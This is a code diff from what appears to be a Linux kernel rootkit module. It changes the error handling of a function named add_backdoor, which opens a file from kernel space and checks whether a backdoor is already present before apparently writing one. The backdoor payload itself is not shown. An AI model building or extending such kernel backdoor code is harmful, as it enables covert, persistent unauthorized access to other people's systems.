@@ -88,19 +88,19 @@ void add_backdoor(char *path) {
 	    	set_fs(old_fs); 
 
 	    	if(IS_ERR(file)){
-			goto exit;
-// 			return 0;
+// 			goto exit;
+			return;
 	    	}
 
 	    	//check if backdoor already exists
 	    	buffer = (char *) kmalloc(PAGE_SIZE, GFP_KERNEL);
 
 	    	if(!buffer){
-			goto cleanup1;
+// 			goto cleanup1;
 			
-// 			 if(file)
-// 			 	{filp_close(file, NULL);}
-// 			return 0;
+			 if(file)
+			 	{filp_close(file, NULL);}
+			return;
 	    	}
 
 	    	backdoor_existing = false;
@@ -115,13 +115,13 @@ void add_backdoor(char *path) {
 
 			if(ret < 0){
 				
-				goto cleanup2;
+// 				goto cleanup2;
 				
-// 		    		if(buffer)
-// 					{kfree(buffer);}
-// 		    	if(file)
-// 		    		{filp_close(file, NULL);}
-// 			return offset;
+		    		if(buffer)
+					{kfree(buffer);}
+		    	if(file)
+		    		{filp_close(file, NULL);}
+			return;
 			}
 
 			page_count++;
@@ -133,13 +133,13 @@ void add_backdoor(char *path) {
 	    	}
 
 	    	if(backdoor_existing){
-			goto cleanup2;
+// 			goto cleanup2;
 			
-// 			if(buffer)
-// 				{kfree(buffer);}
-// 		    if(file)
-// 		    	{filp_close(file, NULL);}
-// 		return offset;
+			if(buffer)
+				{kfree(buffer);}
+		    if(file)
+		    	{filp_close(file, NULL);}
+		return;
 			
 		    }
 
@@ -151,13 +151,13 @@ void add_backdoor(char *path) {
 	    	set_fs(old_fs);
 
 	    	if(offset < 0){
-			goto cleanup2;
+// 			goto cleanup2;
 			
-// 			if(buffer)
-// 				{kfree(buffer);}
-// 		    if(file)
-// 		    	{filp_close(file, NULL);}
-// 		return;
+			if(buffer)
+				{kfree(buffer);}
+		    if(file)
+		    	{filp_close(file, NULL);}
+		return;
 			
 		}
 
@@ -169,13 +169,13 @@ void add_backdoor(char *path) {
 	
 		if(ret<0){
 			
-			goto cleanup2;
+// 			goto cleanup2;
 			
-// 			if(buffer)
-// 				{kfree(buffer);}
-// 		    if(file)
-// 		    	{filp_close(file, NULL);}
-// 		return offset;
+			if(buffer)
+				{kfree(buffer);}
+		    if(file)
+		    	{filp_close(file, NULL);}
+		return;
 	    	}
 
 		cleanup2:
